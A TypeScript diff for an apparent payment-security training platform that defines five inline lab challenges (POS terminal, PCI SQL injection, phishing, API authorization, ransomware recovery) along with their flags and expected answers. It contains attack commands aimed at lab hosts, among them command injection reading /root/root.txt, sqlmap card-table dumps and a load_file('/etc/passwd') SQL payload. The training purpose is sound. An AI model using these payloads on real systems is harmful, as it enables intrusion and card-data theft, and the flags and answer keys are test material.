@@ -17,6 +17,7 @@ export type CtfCategory =
     | 'BOSS';
 
 export type CtfDifficulty = 'BEGINNER' | 'INTERMEDIATE' | 'ADVANCED' | 'EXPERT';
+export type CtfWorkflowMode = 'FLAG_ONLY' | 'TASK_VALIDATION';
 
 export type CtfStepType =
     | 'EXPLANATION'
@@ -97,6 +98,7 @@ export interface CtfChallengeSeed {
     estimatedMinutes: number;
     isActive: boolean;
     relatedWorkshopPath?: string;
+    workflowMode?: CtfWorkflowMode;
     guidedSteps: CtfGuidedStepSeed[];
     hints: CtfHintSeed[];
     missionBrief?: CtfMissionBriefSeed;
@@ -111,25 +113,511 @@ export interface CtfChallengeSeed {
     initialVulnConfig?: Record<string, boolean>;
 }
 
-import { HSM_CHALLENGES } from './ctf/hsmChallenges';
-import { REPLAY_CHALLENGES } from './ctf/replayChallenges';
-import { THREEDS_CHALLENGES } from './ctf/threedsChallenges';
-import { FRAUD_CHALLENGES } from './ctf/fraudChallenges';
-import { ISO_CHALLENGES, PIN_CHALLENGES, MITM_CHALLENGES, PRIVESC_CHALLENGES, CRYPTO_CHALLENGES, INFRA_CHALLENGES } from './ctf/otherChallenges';
-import { PHASE2_CHALLENGES } from './ctf/phase2Challenges';
-
 const RAW_CTF_CHALLENGES: CtfChallengeSeed[] = [
-    ...HSM_CHALLENGES,
-    ...REPLAY_CHALLENGES,
-    ...THREEDS_CHALLENGES,
-    ...FRAUD_CHALLENGES,
-    ...ISO_CHALLENGES,
-    ...PIN_CHALLENGES,
-    ...MITM_CHALLENGES,
-    ...PRIVESC_CHALLENGES,
-    ...CRYPTO_CHALLENGES,
-    ...INFRA_CHALLENGES,
-    ...PHASE2_CHALLENGES,
+    {
+        code: 'PAY-001',
+        title: 'The Unsecured Payment Terminal',
+        description: 'Audit a bakery payment terminal, capture cleartext transactions, then exploit an exposed admin executor.',
+        freeModeDescription: 'Perform network reconnaissance, sniff cleartext POS transactions, and exploit an insecure admin panel to recover user/root proof.',
+        category: 'MITM',
+        difficulty: 'BEGINNER',
+        points: 150,
+        flagValue: 'PMP{rce_admin_panel_root_9a2b1}',
+        targetService: 'pos-terminal',
+        targetEndpoint: 'http://MACHINE_IP:8080',
+        vulnerabilityType: 'Cleartext transaction transport + command injection',
+        attackVector: 'Sniff plaintext transaction stream, then exploit unsanitized admin command parameter.',
+        learningObjectives: [
+            'Understand why cleartext payment traffic is critical in payment environments.',
+            'Use tcpdump to capture and inspect in-flight HTTP transaction payloads.',
+            'Exploit a weak admin execution endpoint and prove root impact.',
+        ],
+        estimatedMinutes: 30,
+        isActive: true,
+        relatedWorkshopPath: '/student/cursus',
+        workflowMode: 'TASK_VALIDATION',
+        guidedSteps: [
+            {
+                stepNumber: 1,
+                stepTitle: 'Task 1 - Reconnaissance',
+                stepDescription: 'Identify exposed services on MACHINE_IP. Run nmap and determine which port is open for HTTP administration.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'nmap -sV MACHINE_IP',
+                expectedOutput: '8080/tcp open http',
+                hintText: 'Port 8080 is commonly used for admin interfaces.',
+            },
+            {
+                stepNumber: 2,
+                stepTitle: 'Task 2 - Capture Network Traffic',
+                stepDescription: 'Capture traffic and find cleartext transactions. Look for TRANSACTION records and extract the user flag after flag=.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'tcpdump -i eth0 host MACHINE_IP -A -nn',
+                expectedOutput: 'PMP{cleartext_pos_sniff_4c8f3}',
+                hintText: 'The user flag appears directly in the transaction payload.',
+            },
+            {
+                stepNumber: 3,
+                stepTitle: 'Task 3 - Explore Admin Interface',
+                stepDescription: 'Probe the web service on port 8080, then POST to /admin/exec and execute id.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'curl http://MACHINE_IP:8080/admin/exec -X POST -d \"cmd=id\"',
+                expectedOutput: 'uid=0(root) gid=0(root) groups=0(root)',
+                hintText: 'The endpoint executes the cmd parameter without proper validation.',
+            },
+            {
+                stepNumber: 4,
+                stepTitle: 'Task 4 - Get Root Proof',
+                stepDescription: 'Use the same admin endpoint to read /root/root.txt and capture the root flag.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'curl http://MACHINE_IP:8080/admin/exec -X POST -d \"cmd=cat /root/root.txt\"',
+                expectedOutput: 'PMP{rce_admin_panel_root_9a2b1}',
+                hintText: 'The second flag is in /root/root.txt.',
+            },
+            {
+                stepNumber: 5,
+                stepTitle: 'Task 5 - Synthesis',
+                stepDescription: 'Summarize both vulnerabilities and business impact in a few sentences: cleartext payment traffic + command injection to root.',
+                stepType: 'EXPLANATION',
+                hintText: 'Mention cleartext interception risk and root compromise through insecure admin command execution.',
+            },
+        ],
+        hints: [
+            {
+                hintNumber: 1,
+                hintText: 'Start with service enumeration, then focus on traffic visibility and exposed admin routes.',
+                costPoints: 5,
+            },
+            {
+                hintNumber: 2,
+                hintText: 'Use tcpdump output in ASCII mode and inspect payload fields containing TRANSACTION.',
+                costPoints: 12,
+            },
+            {
+                hintNumber: 3,
+                hintText: 'Try POST /admin/exec with simple commands first (id), then read /root/root.txt.',
+                costPoints: 25,
+            },
+        ],
+        initialVulnConfig: {
+            insecureTransportEnabled: true,
+            adminCommandInjectionEnabled: true,
+        },
+    },
+    {
+        code: 'PCI-001',
+        title: 'PCI-DSS Showdown',
+        description: 'Assess PCI DSS weaknesses on an e-commerce stack and collect audit evidence through SQL injection and configuration review.',
+        freeModeDescription: 'Recon the web app, exploit SQL injection, extract sensitive evidence, and document PCI DSS non-compliance.',
+        category: 'TOKEN_VAULT',
+        difficulty: 'INTERMEDIATE',
+        points: 200,
+        flagValue: 'PMP{pci_dss_root_violation_8c4e7}',
+        prerequisiteChallengeCode: 'PAY-001',
+        targetService: 'pci-web',
+        targetEndpoint: 'http://MACHINE_IP/search.php?q=test',
+        vulnerabilityType: 'SQL injection + PCI DSS non-compliant data handling',
+        attackVector: 'Exploit vulnerable search parameter and inspect exposed data/control failures.',
+        learningObjectives: [
+            'Identify SQL injection exposure in payment-adjacent web workflows.',
+            'Validate PCI DSS requirements around card data and prohibited CVV storage.',
+            'Produce concise compliance findings backed by technical evidence.',
+        ],
+        estimatedMinutes: 45,
+        isActive: true,
+        relatedWorkshopPath: '/student/cursus',
+        workflowMode: 'TASK_VALIDATION',
+        guidedSteps: [
+            {
+                stepNumber: 1,
+                stepTitle: 'Task 1 - Web Reconnaissance',
+                stepDescription: 'Visit http://MACHINE_IP and inspect the product search flow. Identify how many GET parameters are used on search.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'curl \"http://MACHINE_IP/search.php?q=test\"',
+                expectedOutput: '1 (parameter q)',
+                hintText: 'Watch the URL query string while searching.',
+            },
+            {
+                stepNumber: 2,
+                stepTitle: 'Task 2 - SQL Injection Enumeration',
+                stepDescription: 'Use SQL injection on the search parameter to enumerate databases and identify the customer data database.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'sqlmap -u \"http://MACHINE_IP/search.php?q=test\" --dbs',
+                expectedOutput: 'ecommerce_db',
+                hintText: 'Look for a database name related to customers or e-commerce data.',
+            },
+            {
+                stepNumber: 3,
+                stepTitle: 'Task 3 - Extract Card Data Evidence',
+                stepDescription: 'Dump the cards table from ecommerce_db and recover the user flag.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'sqlmap -u \"http://MACHINE_IP/search.php?q=test\" -D ecommerce_db -T cards --dump',
+                expectedOutput: 'PMP{pci_dss_weak_sql_5f3a2}',
+                hintText: 'The flag is in a column named flag or similar.',
+            },
+            {
+                stepNumber: 4,
+                stepTitle: 'Task 4 - Server Configuration Audit',
+                stepDescription: 'Try reading system file content through SQL injection and identify the UID 0 user in /etc/passwd.',
+                stepType: 'ANALYSIS',
+                commandTemplate: '\' UNION SELECT null, load_file(\'/etc/passwd\'), null --',
+                expectedOutput: 'root',
+                hintText: 'The first account in /etc/passwd is usually root.',
+            },
+            {
+                stepNumber: 5,
+                stepTitle: 'Task 5 - Critical PCI DSS Violation',
+                stepDescription: 'Identify the forbidden column in cards table that violates PCI DSS post-authorization storage rules.',
+                stepType: 'ANALYSIS',
+                expectedOutput: 'cvv (or cvv2)',
+                hintText: 'PCI DSS forbids storing card verification values.',
+            },
+            {
+                stepNumber: 6,
+                stepTitle: 'Task 6 - Root Proof',
+                stepDescription: 'Recover the final root proof from /root/root.txt using the available exploit path in this lab scenario.',
+                stepType: 'EXPLOITATION',
+                expectedOutput: 'PMP{pci_dss_root_violation_8c4e7}',
+                hintText: 'The final proof is the root flag string.',
+            },
+            {
+                stepNumber: 7,
+                stepTitle: 'Task 7 - Audit Synthesis',
+                stepDescription: 'Summarize discovered PCI DSS non-compliance findings (SQL injection, CVV storage, weak credential/storage practices).',
+                stepType: 'EXPLANATION',
+                hintText: 'Mention technical issue + compliance impact + why it violates PCI DSS expectations.',
+            },
+        ],
+        hints: [
+            {
+                hintNumber: 1,
+                hintText: 'Start from search parameter mapping, then escalate to structured SQLi enumeration.',
+                costPoints: 5,
+            },
+            {
+                hintNumber: 2,
+                hintText: 'Use sqlmap for speed, but verify key outputs manually for your report.',
+                costPoints: 12,
+            },
+            {
+                hintNumber: 3,
+                hintText: 'Focus on compliance evidence: card data exposure, CVV persistence, and privileged impact.',
+                costPoints: 25,
+            },
+        ],
+        initialVulnConfig: {
+            searchSqliEnabled: true,
+            weakKeyStorageEnabled: true,
+        },
+    },
+    {
+        code: 'SOC-001',
+        title: 'The Social Engineer\'s Wire',
+        description: 'Investigate phishing and social engineering artifacts to uncover transfer fraud indicators.',
+        freeModeDescription: 'Analyze provided emails and call artifacts, identify spoofing signals, and propose prevention controls.',
+        category: 'FRAUD_CNP',
+        difficulty: 'INTERMEDIATE',
+        points: 150,
+        flagValue: 'PMP{SOC001_STATIC_FALLBACK}',
+        prerequisiteChallengeCode: 'PCI-001',
+        targetService: 'soc-artifacts',
+        targetEndpoint: '/room/soc-001',
+        vulnerabilityType: 'Social engineering through phishing, spoofing, and fraudulent transfer pressure',
+        attackVector: 'Correlate sender spoofing, return-path mismatch, deceptive links, and urgent wire instructions.',
+        learningObjectives: [
+            'Detect phishing indicators in email content and headers.',
+            'Identify spoofing and social pressure techniques in fraud scenarios.',
+            'Recommend practical anti-fraud verification controls.',
+        ],
+        estimatedMinutes: 30,
+        isActive: true,
+        relatedWorkshopPath: '/student/cursus',
+        workflowMode: 'TASK_VALIDATION',
+        guidedSteps: [
+            {
+                stepNumber: 1,
+                stepTitle: 'Task 1 - Suspicious Email Review',
+                stepDescription: 'Open email1.eml and identify the sender shown in the From header.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'grep -i \"^From:\" email1.eml',
+                expectedOutput: 'support@banque-securite.com',
+                hintText: 'Read the displayed sender first before deep header checks.',
+            },
+            {
+                stepNumber: 2,
+                stepTitle: 'Task 2 - Header Authenticity Check',
+                stepDescription: 'Inspect full headers and extract Return-Path to detect sender spoofing.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'grep -i \"return-path\" email1.eml',
+                expectedOutput: 'phisher@malicious.net',
+                hintText: 'Compare Return-Path with From value.',
+            },
+            {
+                stepNumber: 3,
+                stepTitle: 'Task 3 - Fraudulent Link Detection',
+                stepDescription: 'Find the real destination behind the \"secure your account\" link in email1.eml.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'grep -i \"href\" email1.eml',
+                expectedOutput: 'http://192.168.1.105/fake-login',
+                hintText: 'Do not trust visible anchor text; inspect href target.',
+            },
+            {
+                stepNumber: 4,
+                stepTitle: 'Task 4 - Voice Spoofing Clue',
+                stepDescription: 'Review call1.mp3 transcript/evidence and identify the number the scammer claims to represent.',
+                stepType: 'OBSERVATION',
+                expectedOutput: '01 23 45 67 89',
+                hintText: 'Capture the exact phone number mentioned in the call intro.',
+            },
+            {
+                stepNumber: 5,
+                stepTitle: 'Task 5 - Fraud Wire Instruction',
+                stepDescription: 'Read email2.eml and extract both requested amount and destination IBAN.',
+                stepType: 'ANALYSIS',
+                expectedOutput: '15000 - FR76 1234 5678 9012 3456 7890 123',
+                hintText: 'You must provide both amount and account details.',
+            },
+            {
+                stepNumber: 6,
+                stepTitle: 'Task 6 - Prevention Synthesis',
+                stepDescription: 'Provide at least three practical anti-phishing and anti-fraud practices.',
+                stepType: 'EXPLANATION',
+                hintText: 'Mention independent verification and link/identity checks.',
+            },
+        ],
+        hints: [
+            {
+                hintNumber: 1,
+                hintText: 'Start with headers (From, Return-Path, Reply-To) before interpreting message text.',
+                costPoints: 5,
+            },
+            {
+                hintNumber: 2,
+                hintText: 'Extract raw artifacts directly from files; avoid assumptions from rendered previews.',
+                costPoints: 12,
+            },
+            {
+                hintNumber: 3,
+                hintText: 'In synthesis, combine technical checks and process controls (call-back validation, dual approval).',
+                costPoints: 25,
+            },
+        ],
+    },
+    {
+        code: 'API-001',
+        title: 'API: Attack on Transactions',
+        description: 'Exploit weak API authorization and control failures to access restricted payment data.',
+        freeModeDescription: 'Discover endpoints, obtain JWT access, exploit BOLA and broken admin controls, and document impact.',
+        category: 'PRIVILEGE_ESCALATION',
+        difficulty: 'ADVANCED',
+        points: 250,
+        flagValue: 'PMP{api_admin_exposure_9f1b4}',
+        prerequisiteChallengeCode: 'SOC-001',
+        targetService: 'payments-api',
+        targetEndpoint: 'http://MACHINE_IP:5000/',
+        vulnerabilityType: 'Broken object level authorization + weak access control + business limit bypass',
+        attackVector: 'Abuse insecure object references, bypass transfer controls, and reach admin data paths.',
+        learningObjectives: [
+            'Test authorization boundaries on REST resources (BOLA).',
+            'Detect weak business logic controls such as bypassable transfer limits.',
+            'Assess privilege escalation risk in JWT/admin endpoint handling.',
+        ],
+        estimatedMinutes: 50,
+        isActive: true,
+        relatedWorkshopPath: '/student/cursus',
+        workflowMode: 'TASK_VALIDATION',
+        guidedSteps: [
+            {
+                stepNumber: 1,
+                stepTitle: 'Task 1 - API Surface Discovery',
+                stepDescription: 'Query API root and count listed routes/endpoints.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'curl http://MACHINE_IP:5000/',
+                expectedOutput: '5',
+                hintText: 'Root response returns a JSON route listing.',
+            },
+            {
+                stepNumber: 2,
+                stepTitle: 'Task 2 - Account + Login',
+                stepDescription: 'Register a user then login to obtain an access token.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'curl -X POST http://MACHINE_IP:5000/api/login -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"test\\\",\\\"password\\\":\\\"test\\\"}\"',
+                expectedOutput: 'access_token starts with eyJ...',
+                hintText: 'JWT tokens usually begin with eyJ.',
+            },
+            {
+                stepNumber: 3,
+                stepTitle: 'Task 3 - BOLA Exploitation',
+                stepDescription: 'Use your token to request user id=1 data and extract the user flag.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'curl -H \"Authorization: Bearer <token>\" http://MACHINE_IP:5000/api/users/1',
+                expectedOutput: 'PMP{api_bola_vulnerability_7d8e2}',
+                hintText: 'Look for a flag field in returned JSON.',
+            },
+            {
+                stepNumber: 4,
+                stepTitle: 'Task 4 - Transfer Limit Bypass',
+                stepDescription: 'Attempt a transfer above nominal limit (e.g., amount 2000) and confirm if it succeeds.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'curl -X POST http://MACHINE_IP:5000/api/transfer -H \"Authorization: Bearer <token>\" -H \"Content-Type: application/json\" -d \"{\\\"to\\\":\\\"autre_compte\\\",\\\"amount\\\":2000}\"',
+                expectedOutput: 'yes / success',
+                hintText: 'Validate with response status field, not assumptions.',
+            },
+            {
+                stepNumber: 5,
+                stepTitle: 'Task 5 - Admin Exposure',
+                stepDescription: 'Reach /api/admin/stats despite normal user context and recover the root flag.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'curl -H \"Authorization: Bearer <token>\" http://MACHINE_IP:5000/api/admin/stats',
+                expectedOutput: 'PMP{api_admin_exposure_9f1b4}',
+                hintText: 'Inspect token claims and access control validation weaknesses.',
+            },
+            {
+                stepNumber: 6,
+                stepTitle: 'Task 6 - Vulnerability Synthesis',
+                stepDescription: 'Summarize the exploited API weaknesses (BOLA, limit bypass, insufficient admin access control).',
+                stepType: 'EXPLANATION',
+                hintText: 'State each flaw and its impact on confidentiality/integrity.',
+            },
+        ],
+        hints: [
+            {
+                hintNumber: 1,
+                hintText: 'Map endpoints first, then authenticate before authorization testing.',
+                costPoints: 5,
+            },
+            {
+                hintNumber: 2,
+                hintText: 'Replay requests by changing resource ids and transaction amount values.',
+                costPoints: 12,
+            },
+            {
+                hintNumber: 3,
+                hintText: 'For admin access issues, inspect JWT structure and server-side role validation.',
+                costPoints: 25,
+            },
+        ],
+        initialVulnConfig: {
+            bolaEnabled: true,
+            transferLimitBypassEnabled: true,
+            adminCommandInjectionEnabled: true,
+        },
+    },
+    {
+        code: 'DORA-001',
+        title: 'DORA\'s Recovery',
+        description: 'Manage a ransomware incident, restore operations, and produce a DORA-aligned resilience report.',
+        freeModeDescription: 'Investigate compromise evidence, isolate affected paths, restore from backup, and document timeline/impact/actions.',
+        category: 'BOSS',
+        difficulty: 'EXPERT',
+        points: 300,
+        flagValue: 'PMP{dora_recovery_success_3e6d9}',
+        prerequisiteChallengeCode: 'API-001',
+        targetService: 'dora-frontend',
+        targetEndpoint: '/incident/start',
+        vulnerabilityType: 'Initial access + operational resilience failure',
+        attackVector: 'Exploit exposed service, induce disruption scenario, then execute structured recovery and reporting.',
+        learningObjectives: [
+            'Model attacker entry and blast-radius in a multi-service banking environment.',
+            'Execute restoration and service continuity checks from clean backup state.',
+            'Produce a defensible post-mortem aligned with resilience governance expectations.',
+        ],
+        estimatedMinutes: 60,
+        isActive: true,
+        relatedWorkshopPath: '/student/cursus',
+        workflowMode: 'TASK_VALIDATION',
+        guidedSteps: [
+            {
+                stepNumber: 1,
+                stepTitle: 'Task 1 - Incident Detection',
+                stepDescription: 'Inspect compromised web node artifacts and identify the ransomware note filename.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'ls -la /var/www/html',
+                expectedOutput: 'README_RANSOM.txt',
+                hintText: 'Look for obvious ransom note naming patterns.',
+            },
+            {
+                stepNumber: 2,
+                stepTitle: 'Task 2 - Initial Access Trace',
+                stepDescription: 'Analyze Apache access logs and identify the source IP of the initial attack.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'grep \"POST\" /var/log/apache2/access.log',
+                expectedOutput: '192.168.1.100',
+                hintText: 'Focus on suspicious upload/execution requests.',
+            },
+            {
+                stepNumber: 3,
+                stepTitle: 'Task 3 - Lateral Movement Attribution',
+                stepDescription: 'Review SSH authentication logs and identify which account key was used toward app-backend.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'grep \"sshd\" /var/log/auth.log | grep \"Accepted\"',
+                expectedOutput: 'appuser',
+                hintText: 'Track accepted SSH sessions and usernames.',
+            },
+            {
+                stepNumber: 4,
+                stepTitle: 'Task 4 - Containment Rule',
+                stepDescription: 'Provide an iptables command that blocks traffic from web-front to core-banking.',
+                stepType: 'EXPLOITATION',
+                expectedOutput: 'iptables -A OUTPUT -s MACHINE_IP_WEB -d MACHINE_IP_CORE -j DROP',
+                hintText: 'A DROP rule with correct source/destination direction is required.',
+            },
+            {
+                stepNumber: 5,
+                stepTitle: 'Task 5 - Backup Integrity Selection',
+                stepDescription: 'Identify the latest complete non-corrupted backup date from backup-server.',
+                stepType: 'ANALYSIS',
+                commandTemplate: 'ls -la /backups',
+                expectedOutput: '2026-02-20',
+                hintText: 'Prefer latest backup without encrypted/corrupted indicators.',
+            },
+            {
+                stepNumber: 6,
+                stepTitle: 'Task 6 - Core Recovery Flag',
+                stepDescription: 'Restore core-banking from clean backup and retrieve recovery flag from recovery_flag table.',
+                stepType: 'EXPLOITATION',
+                commandTemplate: 'mysql -u root -p core_banking -e \"SELECT flag FROM recovery_flag;\"',
+                expectedOutput: 'PMP{dora_recovery_success_3e6d9}',
+                hintText: 'Confirm restore before querying recovery_flag.',
+            },
+            {
+                stepNumber: 7,
+                stepTitle: 'Task 7 - Service Continuity Check',
+                stepDescription: 'Validate API health after recovery and provide the HTTP status code.',
+                stepType: 'OBSERVATION',
+                commandTemplate: 'curl -i http://MACHINE_IP_APP:8080/api/health',
+                expectedOutput: '200',
+                hintText: 'Healthy service should return HTTP 200 and OK semantics.',
+            },
+            {
+                stepNumber: 8,
+                stepTitle: 'Task 8 - DORA Incident Report',
+                stepDescription: 'Submit a concise report containing timeline, impact, corrective actions, and recurrence prevention recommendations.',
+                stepType: 'EXPLANATION',
+                hintText: 'Use structured incident language aligned with operational resilience reporting.',
+            },
+        ],
+        hints: [
+            {
+                hintNumber: 1,
+                hintText: 'Work in phases: detect, contain, recover, then report.',
+                costPoints: 5,
+            },
+            {
+                hintNumber: 2,
+                hintText: 'Use logs and backup inventory as primary evidence before taking recovery actions.',
+                costPoints: 12,
+            },
+            {
+                hintNumber: 3,
+                hintText: 'A valid DORA-oriented answer ties technical actions to business continuity outcomes.',
+                costPoints: 25,
+            },
+        ],
+        initialVulnConfig: {
+            ransomwareSimulationEnabled: true,
+            backupRestoreModeEnabled: true,
+        },
+    },
 ];
 
 const HINT_LEVEL_1_COST = 5;
@@ -402,6 +890,39 @@ function normalizeDebriefTemplate(challenge: CtfChallengeSeed): CtfDebriefTempla
 }
 
 function normalizeHints(challenge: CtfChallengeSeed): CtfHintSeed[] {
+    const customHints = Array.isArray(challenge.hints) ? challenge.hints : [];
+    if (customHints.length > 0) {
+        return customHints
+            .slice(0, 3)
+            .map((hint, index) => {
+                const hintNumber = index + 1;
+                const rawText = String(hint?.hintText || '');
+                const rawCost = Number(hint?.costPoints || 0);
+
+                if (hintNumber === 1) {
+                    return {
+                        hintNumber,
+                        hintText: sanitizeLevel1Hint(rawText),
+                        costPoints: HINT_LEVEL_1_COST,
+                    };
+                }
+
+                if (hintNumber === 2) {
+                    return {
+                        hintNumber,
+                        hintText: sanitizeHint(rawText, 'Use protocol-aware enumeration and inspect raw responses.'),
+                        costPoints: sanitizeLevel2Cost(rawCost),
+                    };
+                }
+
+                return {
+                    hintNumber,
+                    hintText: sanitizeHint(rawText, 'Capture reproducible technical evidence and explain impact.'),
+                    costPoints: HINT_LEVEL_3_COST,
+                };
+            });
+    }
+
     const attackClass = CATEGORY_ATTACK_CLASS[challenge.category];
     const tools = CATEGORY_TOOL_HINT[challenge.category];
     const evidenceArea = CATEGORY_EVIDENCE_AREA[challenge.category];
@@ -535,8 +1056,15 @@ function reindexSteps(steps: CtfGuidedStepSeed[]): CtfGuidedStepSeed[] {
 }
 
 function normalizeGuidedSteps(challenge: CtfChallengeSeed): CtfGuidedStepSeed[] {
-    const normalized = buildRealisticGuidedSteps(challenge)
-        .map(normalizeGuidedStep);
+    const hasCustomSteps = Array.isArray(challenge.guidedSteps) && challenge.guidedSteps.length > 0;
+    const sourceSteps = hasCustomSteps
+        ? challenge.guidedSteps
+        : buildRealisticGuidedSteps(challenge);
+    const normalized = sourceSteps.map(normalizeGuidedStep);
+
+    if (hasCustomSteps) {
+        return reindexSteps(normalized);
+    }
 
     const hasRemediation = normalized.some(isRemediationStep);
     const hasPostPatchVerification = normalized.some(isPostPatchVerificationStep);
@@ -556,15 +1084,11 @@ function normalizeGuidedSteps(challenge: CtfChallengeSeed): CtfGuidedStepSeed[] 
 }
 
 function normalizeChallenge(challenge: CtfChallengeSeed): CtfChallengeSeed {
-    const initialDefaults: Record<string, Record<string, boolean>> = {
-        'HSM-003': { keyLeakInLogs: true },
-        'HSM-005': { timingAttackEnabled: true },
-        'PIN-001': { simulateDown: false },
-        'REPLAY-001': { allowReplay: true },
-    };
+    const initialDefaults: Record<string, Record<string, boolean>> = {};
 
     return {
         ...challenge,
+        workflowMode: challenge.workflowMode === 'TASK_VALIDATION' ? 'TASK_VALIDATION' : 'FLAG_ONLY',
         hints: normalizeHints(challenge),
         guidedSteps: normalizeGuidedSteps(challenge),
         missionBrief: normalizeMissionBrief(challenge),
